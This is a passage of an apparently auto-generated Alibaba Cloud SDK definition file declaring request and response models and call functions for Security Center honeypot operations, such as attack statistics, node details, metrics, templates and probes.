- **3**: In trial', example='1'),
  requestId?: string(name='RequestId', description='The ID of this call request, which is a unique identifier generated by Alibaba Cloud for this request and can be used to troubleshoot and locate issues.', example='8B30CCDD-B79A-5844-BE66-F6D51335
XXXX'),
}

model GetFunctionTrialStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetFunctionTrialStatusResponseBody(name='body'),
}

/**
 * @summary Get Trial Status
 *
 * @param request GetFunctionTrialStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetFunctionTrialStatusResponse
 */
async function getFunctionTrialStatusWithOptions(request: GetFunctionTrialStatusRequest, runtime: Util.RuntimeOptions): GetFunctionTrialStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.functionName)) {
    query['FunctionName'] = request.functionName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetFunctionTrialStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get Trial Status
 *
 * @param request GetFunctionTrialStatusRequest
 * @return GetFunctionTrialStatusResponse
 */
async function getFunctionTrialStatus(request: GetFunctionTrialStatusRequest): GetFunctionTrialStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFunctionTrialStatusWithOptions(request, runtime);
}

model GetHoneyPotUploadPolicyInfoRequest {
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model GetHoneyPotUploadPolicyInfoResponseBody = {
  code?: string(name='Code', description='The HTTP status code returned.', example='200'),
  data?: {
    accessid?: string(name='Accessid', description='The key ID that is required for the file upload.', example='LTAI4G1mgPbjvGQuiV1X****'),
    expire?: string(name='Expire', description='The expiration time of the URL. The value is a timestamp. You can use the value to determine whether the URL expires. If the expiration time arrives, you can no longer use the URL to upload files.', example='1661443200000'),
    host?: string(name='Host', description='The request URL during the upload.', example='https://aegis-update-static-file.oss-cn-hangzhou.aliyuncs.com'),
    key?: string(name='Key', description='The full path of the file in OSS. The file is uploaded by calling the OSS PostObject operation.', example='HONEYPOT_FILE/1766185894104675_169********'),
    policy?: string(name='Policy', description='The limits that are imposed on the file upload. The limits include the file size.', example='eyJleHBpcmF0aW9uIjoiMjAyMy0wOS0wMVQwMzoyNTozNS44MzZaIiwiY29uZGl0aW9ucyI6W1siY29udGVudC1sZW5ndGgtcmFuZ2UiLDAsMTA0ODU3NjAwXSxbInN0YXJ0cy13aXRoIiwiJGtleSIsIkhPTkVZUE9UX0ZJTEUvMTc2NjE4NTg5NDEwNDY3NV8xNjkzNTM4NDM1N*****************'),
    securityToken?: string(name='SecurityToken'),
    signature?: string(name='Signature', description='The signature that is calculated based on **AccessKeySecret** and **Policy**. When you call an Object Storage Service (OSS) API operation, OSS uses the signature information to verify the POST request.', example='wKPqlFneNTZPn52k2Rz9GTY*****'),
  }(name='Data', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='8C177095-A734-59B2-9409-7D4F26FF****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetHoneyPotUploadPolicyInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetHoneyPotUploadPolicyInfoResponseBody(name='body'),
}

/**
 * @summary Obtains the URL that is used to upload a file to a honeypot.
 *
 * @param request GetHoneyPotUploadPolicyInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetHoneyPotUploadPolicyInfoResponse
 */
async function getHoneyPotUploadPolicyInfoWithOptions(request: GetHoneyPotUploadPolicyInfoRequest, runtime: Util.RuntimeOptions): GetHoneyPotUploadPolicyInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneyPotUploadPolicyInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains the URL that is used to upload a file to a honeypot.
 *
 * @param request GetHoneyPotUploadPolicyInfoRequest
 * @return GetHoneyPotUploadPolicyInfoResponse
 */
async function getHoneyPotUploadPolicyInfo(request: GetHoneyPotUploadPolicyInfoRequest): GetHoneyPotUploadPolicyInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneyPotUploadPolicyInfoWithOptions(request, runtime);
}

model GetHoneypotAttackStatisticsRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Pages start from page **1**. Default value: **1**.', example='1'),
  endTimeStamp?: long(name='EndTimeStamp', description='The end time. The value is a UNIX timestamp.', example='1675058931215'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page. We recommend that you do not leave this parameter empty.', example='20'),
  riskLevelList?: [ string ](name='RiskLevelList', description='The risk levels.'),
  srcIp?: string(name='SrcIp', description='The source IP address of the attack.

This parameter is required.', example='47.92.139.**'),
  startTimeStamp?: long(name='StartTimeStamp', description='The start time. The value is a UNIX timestamp.', example='1681624877761'),
  statisticsType?: string(name='StatisticsType', description='The type of the attack source statistics. Valid values:

*   **TOP_ATTACKED_AGENT**: the top 5 probes that are attacked the most frequently
*   **TOP_ATTACKED_IP**: the top 5 IP addresses that are attacked the most frequently
*   **ATTACK_EVENT_TYPE**: the type of the intrusion event
*   **ATTACK_HONEYPOT_TYPE**: the type of the attacked honeypot

This parameter is required.', example='TOP_ATTACKED_IP'),
}

model GetHoneypotAttackStatisticsResponseBody = {
  code?: string(name='Code', description='The status code that is returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    count?: int32(name='Count', description='The number of entries on the current page.', example='2'),
    honeypotAttackStatistics?: [ 
      {
        statisticsCount?: int32(name='StatisticsCount', description='The number of times the value is counted.', example='10'),
        statisticsValue?: string(name='StatisticsValue', description='The statistical value.', example='112.168.1.**'),
      }
    ](name='HoneypotAttackStatistics', description='The statistics details.'),
    statisticsType?: string(name='StatisticsType', description='The type of the attack source statistics. Valid values:

*   **TOP_ATTACKED_AGENT**: the top five probes that are attacked the most frequently.
*   **TOP_ATTACKED_IP**: the top five IP addresses that are attacked the most frequently.
*   **ATTACK_EVENT_TYPE**: the type of the intrusion event.
*   **ATTACK_HONEYPOT_TYPE**: the type of the attacked honeypot.', example='TOP_ATTACKED_IP'),
  }(name='Data', description='The statistics.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='3FACC60A-3FE4-5F49-9184-50730C8B****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetHoneypotAttackStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetHoneypotAttackStatisticsResponseBody(name='body'),
}

/**
 * @summary 获取蜜罐攻击统计数据
 *
 * @param request GetHoneypotAttackStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetHoneypotAttackStatisticsResponse
 */
async function getHoneypotAttackStatisticsWithOptions(request: GetHoneypotAttackStatisticsRequest, runtime: Util.RuntimeOptions): GetHoneypotAttackStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTimeStamp)) {
    query['EndTimeStamp'] = request.endTimeStamp;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevelList)) {
    query['RiskLevelList'] = request.riskLevelList;
  }
  if (!Util.isUnset(request.srcIp)) {
    query['SrcIp'] = request.srcIp;
  }
  if (!Util.isUnset(request.startTimeStamp)) {
    query['StartTimeStamp'] = request.startTimeStamp;
  }
  if (!Util.isUnset(request.statisticsType)) {
    query['StatisticsType'] = request.statisticsType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotAttackStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 获取蜜罐攻击统计数据
 *
 * @param request GetHoneypotAttackStatisticsRequest
 * @return GetHoneypotAttackStatisticsResponse
 */
async function getHoneypotAttackStatistics(request: GetHoneypotAttackStatisticsRequest): GetHoneypotAttackStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotAttackStatisticsWithOptions(request, runtime);
}

model GetHoneypotEventTrendRequest {
  endTimeStamp?: long(name='EndTimeStamp', description='End time, timestamp format.', example='1687831329169'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  riskLevelList?: [ string ](name='RiskLevelList', description='The risk levels of the alert events.'),
  srcIp?: string(name='SrcIp', description='The source IP address of the attack.

This parameter is required.', example='10.91.254.***'),
  startTimeStamp?: long(name='StartTimeStamp', description='Start time, timestamp format.', example='1683516557757'),
}

model GetHoneypotEventTrendResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
  data?: [ 
    {
      count?: int32(name='Count', description='The number of attacks that occurred.', example='5'),
      keyName?: string(name='KeyName', description='The name of the attack.', example='ATTACK_EVENT'),
      timeStamp?: long(name='TimeStamp', description='The timestamp when the attack event occurred.', example='1686968163644'),
    }
  ](name='Data', description='The list of data returned. ￼'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='21637690-9B21-5EEC-94DB-2A732480****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model GetHoneypotEventTrendResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetHoneypotEventTrendResponseBody(name='body'),
}

/**
 * @summary Obtain attack trend statistics for a single attack source.
 *
 * @param request GetHoneypotEventTrendRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetHoneypotEventTrendResponse
 */
async function getHoneypotEventTrendWithOptions(request: GetHoneypotEventTrendRequest, runtime: Util.RuntimeOptions): GetHoneypotEventTrendResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.endTimeStamp)) {
    query['EndTimeStamp'] = request.endTimeStamp;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskLevelList)) {
    query['RiskLevelList'] = request.riskLevelList;
  }
  if (!Util.isUnset(request.srcIp)) {
    query['SrcIp'] = request.srcIp;
  }
  if (!Util.isUnset(request.startTimeStamp)) {
    query['StartTimeStamp'] = request.startTimeStamp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotEventTrend',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtain attack trend statistics for a single attack source.
 *
 * @param request GetHoneypotEventTrendRequest
 * @return GetHoneypotEventTrendResponse
 */
async function getHoneypotEventTrend(request: GetHoneypotEventTrendRequest): GetHoneypotEventTrendResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotEventTrendWithOptions(request, runtime);
}

model GetHoneypotNodeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  nodeId?: string(name='NodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.

This parameter is required.', example='d3dd3864-4e02-4abd-8b6a-8f5f6fec4715'),
}

model GetHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotNode?: {
    allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Indicates whether a honeypot is allowed to access the Internet. Valid values:

*   **true**: The honeypot is allowed to access the Internet.
*   **false**: The honeypot is not allowed to access the Internet.', example='true'),
    createTime?: string(name='CreateTime', description='The time when the management node was created.', example='2022-12-02 17:13:43'),
    ecsInstanceId?: string(name='EcsInstanceId', description='The ID of the instance.', example='i-2vccskxjunf1ag6w****'),
    honeypotTotalCount?: int32(name='HoneypotTotalCount', description='The maximum number of honeypots that can be deployed to the management node.', example='10'),
    honeypotUsedCount?: int32(name='HoneypotUsedCount', description='The number of honeypots that are deployed to the management node.', example='5'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a7409a58-bc60-41af-9d36-080d58ae****'),
    nodeIp?: string(name='NodeIp', description='The IP address of the management node.', example='101.37.XX.XX'),
    nodeName?: string(name='NodeName', description='The name of the management node.', example='gmmc'),
    probeTotalCount?: int32(name='ProbeTotalCount', description='The maximum number of probes that can be deployed for the management node.', example='20'),
    probeUsedCount?: int32(name='ProbeUsedCount', description='The number of probes that are deployed for the management node.', example='15'),
    securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='An array consisting of the CIDR blocks that are allowed to access the management node.'),
    totalStatus?: int32(name='TotalStatus', description='The status of the management node. Valid values:

*   **0**: preparing
*   **1**: normal
*   **2**: abnormal
*   **4**: starting
*   **5**: upgrading', example='2'),
    upgradeAvailable?: boolean(name='UpgradeAvailable', description='Indicates whether the management node can be upgraded. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  }(name='HoneypotNode', description='The details of the management node.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0A453658-070B-5554-B46C-867425BE4FD4'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model GetHoneypotNodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetHoneypotNodeResponseBody(name='body'),
}

/**
 * @summary Queries the details of a specified management node.
 *
 * @param request GetHoneypotNodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetHoneypotNodeResponse
 */
async function getHoneypotNodeWithOptions(request: GetHoneypotNodeRequest, runtime: Util.RuntimeOptions): GetHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of a specified management node.
 *
 * @param request GetHoneypotNodeRequest
 * @return GetHoneypotNodeResponse
 */
async function getHoneypotNode(request: GetHoneypotNodeRequest): GetHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotNodeWithOptions(request, runtime);
}

model GetHoneypotNodeMetricListRequest {
  endTime?: string(name='EndTime', description='The end of the time range to query. Valid values:

*   UNIX timestamp: the number of milliseconds that have elapsed since January 1, 1970, 00:00:00 UTC
*   Date format: YYYY-MM-DDThh:mm:ssZ', example='2019-01-30 00:10:00'),
  express?: string(name='Express', description='The expression that is used to compute the query results in real time.

>  Only the groupby expression is supported. This expression is similar to the GROUP BY statement that applies to databases.', example='{"groupby":["userId","instanceId"]}'),
  length?: string(name='Length', description='The number of entries per page.

>  The maximum value of the Length parameter in a request is 1440.', example='100'),
  metricName?: string(name='MetricName', description='The metric that is used to monitor the cloud service.', example='cpu_total'),
  namespace?: string(name='Namespace', description='The namespace of the cloud service. Format: acs_cloud service name.', example='acs_ecs_dashboard'),
  nodeId?: string(name='NodeId', description='The management node ID.', example='cc427e14-f257-4670-9d2b-d83bbbe7****'),
  period?: string(name='Period', description='The time interval. Unit: seconds. Valid values: 60, 300, and 900.', example='60'),
  startTime?: string(name='StartTime', description='The beginning of the time range to query. The following formats are supported:

*   UNIX timestamp: the number of milliseconds that have elapsed since January 1, 1970, 00:00:00 UTC
*   Date format: YYYY-MM-DDThh:mm:ssZ
*   The interval between the start time and the end time is less than or equal to 31 days.', example='2019-01-30 00:00:00'),
}

model GetHoneypotNodeMetricListResponseBody = {
  data?: string(name='Data', description='The monitoring data.', example='{
    "code": "200",
    "datapoints": "[{\\\\"timestamp\\\\":1698375060000,\\\\"instanceId\\\\":\\\\"i-bp18jn50nid83nsu****\\\\",\\\\"ip\\\\":\\\\"1.1.1.1\\\\",\\\\"userId\\\\":\\\\"132776878515****\\\\",\\\\"Minimum\\\\":67084.0,\\\\"Maximum\\\\":67084.0,\\\\"Average\\\\":67084.0},{\\\\"timestamp\\\\":1698375120000,\\\\"instanceId\\\\":\\\\"i-bp18jn50nid83nsu****\\\\",\\\\"ip\\\\":\\\\"1.1.1.1\\\\",\\\\"userId\\\\":\\\\"132776878515****\\\\",\\\\"Minimum\\\\":63704.0,\\\\"Maximum\\\\":63704.0,\\\\"Average\\\\":63704.0},{\\\\"timestamp\\\\":1698375180000,\\\\"instanceId\\\\":\\\\"i-bp18jn50nid83nsu****\\\\",\\\\"ip\\\\":\\\\"1.1.1.1\\\\",\\\\"userId\\\\":\\\\"132776878515****\\\\",\\\\"Minimum\\\\":67624.0,\\\\"Maximum\\\\":67624.0,\\\\"Average\\\\":67624.0},{\\\\"timestamp\\\\":1698375240000,\\\\"instanceId\\\\":\\\\"i-bp18jn50nid83nsu****\\\\",\\\\"ip\\\\":\\\\"1.1.1.1\\\\",\\\\"userId\\\\":\\\\"132776878515****\\\\",\\\\"Minimum\\\\":68432.0,\\\\"Maximum\\\\":68432.0,\\\\"Average\\\\":68432.0},{\\\\"timestamp\\\\":1698375300000,\\\\"instanceId\\\\":\\\\"i-bp18jn50nid83nsu****\\\\",\\\\"ip\\\\":\\\\"1.1.1.1\\\\",\\\\"userId\\\\":\\\\"132776878515****\\\\",\\\\"Minimum\\\\":70148.0,\\\\"Maximum\\\\":70148.0,\\\\"Average\\\\":70148.0},{\\\\"timestamp\\\\":1698375360000,\\\\"instanceId\\\\":\\\\"i-bp18jn50nid83nsu****\\\\",\\\\"ip\\\\":\\\\"1.1.1.1\\\\",\\\\"userId\\\\":\\\\"132776878515****\\\\",\\\\"Minimum\\\\":63612.0,\\\\"Maximum\\\\":63612.0,\\\\"Average\\\\":63612.0},{\\\\"timestamp\\\\":1698375420000,\\\\"instanceId\\\\":\\\\"i-bp18jn50nid83nsu****\\\\",\\\\"ip\\\\":\\\\"1.1.1.1\\\\",\\\\"userId\\\\":\\\\"132776878515****\\\\",\\\\"Minimum\\\\":68032.0,\\\\"Maximum\\\\":68032.0,\\\\"Average\\\\":68032.0},{\\\\"timestamp\\\\":1698375480000,\\\\"instanceId\\\\":\\\\"i-bp18jn50nid83nsu****\\\\",\\\\"ip\\\\":\\\\"1.1.1.1\\\\",\\\\"userId\\\\":\\\\"132776878515****\\\\",\\\\"Minimum\\\\":67400.0,\\\\"Maximum\\\\":67400.0,\\\\"Average\\\\":67400.0},{\\\\"timestamp\\\\":1698375540000,\\\\"instanceId\\\\":\\\\"i-bp18jn50nid83nsu****\\\\",\\\\"ip\\\\":\\\\"1.1.1.1\\\\",\\\\"userId\\\\":\\\\"132776878515****\\\\",\\\\"Minimum\\\\":65352.0,\\\\"Maximum\\\\":65352.0,\\\\"Average\\\\":65352.0}]",
    "period": "60",
    "requestId": "AFE33E4E-70A3-5BAE-AEA8-4D3BF3A75067",
    "success": true
}'),
  requestId?: string(name='RequestId', description='The request ID, which is used to locate and troubleshoot issues.', example='48F523DA-4C7E-5417-B872-E313E5A4****'),
}

model GetHoneypotNodeMetricListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetHoneypotNodeMetricListResponseBody(name='body'),
}

/**
 * @summary Queries the monitoring data of management nodes to which the cloud honeypot belongs.
 *
 * @param request GetHoneypotNodeMetricListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetHoneypotNodeMetricListResponse
 */
async function getHoneypotNodeMetricListWithOptions(request: GetHoneypotNodeMetricListRequest, runtime: Util.RuntimeOptions): GetHoneypotNodeMetricListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.express)) {
    query['Express'] = request.express;
  }
  if (!Util.isUnset(request.length)) {
    query['Length'] = request.length;
  }
  if (!Util.isUnset(request.metricName)) {
    query['MetricName'] = request.metricName;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.period)) {
    query['Period'] = request.period;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotNodeMetricList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the monitoring data of management nodes to which the cloud honeypot belongs.
 *
 * @param request GetHoneypotNodeMetricListRequest
 * @return GetHoneypotNodeMetricListResponse
 */
async function getHoneypotNodeMetricList(request: GetHoneypotNodeMetricListRequest): GetHoneypotNodeMetricListResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotNodeMetricListWithOptions(request, runtime);
}

model GetHoneypotPresetRequest {
  honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.

> You can call the [ListHoneypotPreset](~~ListHoneypotPreset~~) operation to query the IDs of honeypot templates.

This parameter is required.', example='207ca117-44b9-495d-84e7-50289b4cxxxx'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
}

model GetHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='managerNodename'),
    fileInfoList?: [ 
      {
        fileId?: string(name='FileId', description='The ID of the uploaded file.', example='HONEYPOT_FILE/1765_167040128****'),
        fileName?: string(name='FileName', description='The name of the uploaded file.', example='HONEYPOT_FILE****'),
        ossUrl?: string(name='OssUrl', description='The download URL.', example='http://aegis****'),
      }
    ](name='FileInfoList', description='An array that consists of the configurations of the uploaded file.'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='RuoYi'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='ruoyi'),
    honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.', example='94fd8805-d178-4361-84d3-de47fb4e****'),
    meta?: string(name='Meta', description='The custom configuration of the honeypot template.', example='{"trojan_git":"zip","burp":"open","portrait_option":"true"}'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetName?: string(name='PresetName', description='The custom name of the honeypot template.', example='ssh'),
    presetType?: string(name='PresetType', description='The type of the honeypot template. Valid values:

*   **TEMP**: automatically generated template
*   **CUSTOM**: custom template
*   **DEFAULT**: default template', example='CUSTOM'),
  }(name='Data', description='The information about the honeypot template.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='38AFE393-88E8-5642-B3E2-D57C6E76025D'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model GetHoneypotPresetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetHoneypotPresetResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of a specified honeypot template.
 *
 * @param request GetHoneypotPresetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetHoneypotPresetResponse
 */
async function getHoneypotPresetWithOptions(request: GetHoneypotPresetRequest, runtime: Util.RuntimeOptions): GetHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of a specified honeypot template.
 *
 * @param request GetHoneypotPresetRequest
 * @return GetHoneypotPresetResponse
 */
async function getHoneypotPreset(request: GetHoneypotPresetRequest): GetHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotPresetWithOptions(request, runtime);
}

model GetHoneypotProbeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  probeId?: string(name='ProbeId', description='The probe ID.

> You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.

This parameter is required.', example='d6c1ebc9-a90d-4c9e-9490-328814d1ca00'),
}

model GetHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    arp?: boolean(name='Arp', description='Indicates whether address resolution protocol (ARP) is enabled for the check type.', example='true'),
    canListenIpList?: [ string ](name='CanListenIpList', description='An array consisting of the IP addresses that can be monitored.'),
    cidrList?: [ string ](name='CidrList', description='The CIDR blocks of the probe deployed in a virtual private cloud (VPC).'),
    controlNode?: {
      ecsInstanceId?: string(name='EcsInstanceId', description='The instance ID of the management node.', example='i-bp19ijepxytwtzrk****'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='37a15ff1-3475-4897-aa6c-f7fd9122****'),
      nodeName?: string(name='NodeName', description='The name of the management node.', example='online-honeypot'),
    }(name='ControlNode', description='The information about the management node.'),
    cpuLoad?: double(name='CpuLoad', description='The CPU utilization.', example='0.51'),
    deployTime?: long(name='DeployTime', description='The time when the probe was deployed.', example='1669363825000'),
    displayName?: string(name='DisplayName', description='The name of the probe.', example='test-probe'),
    honeyPotProbeScanPort?: {
      id?: long(name='Id', description='The unique ID of the service that is monitored.', example='15389'),
      ports?: string(name='Ports', description='The ports that are monitored.', example='{
    "tcp": "1-65535",
    "udp": "1-65535"
}'),
